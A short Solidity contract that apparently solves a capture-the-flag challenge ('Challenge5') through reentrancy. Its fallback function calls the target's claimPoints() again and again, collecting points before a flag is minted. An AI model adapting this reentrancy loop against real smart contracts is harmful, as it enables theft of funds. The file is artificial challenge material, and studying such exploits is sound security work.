//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {Challenge5} from "./Challenge5.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface IChallenge5 {
    function claimPoints() external;
    function mintFlag() external;
}
contract Challenge5Solution is Ownable{
    IChallenge5 chal5;
    uint256 public points;

    constructor(address _chal5Address) Ownable(msg.sender) {
        chal5 = IChallenge5(_chal5Address);
    }

    function startClaimingPoints() public onlyOwner{
        points = 0;
        chal5.claimPoints();
    }
    fallback() external payable {
        if(points < 10){
            points++;
            chal5.claimPoints();
        }
    }
    function mintFlag() external {
        chal5.mintFlag();
    }

}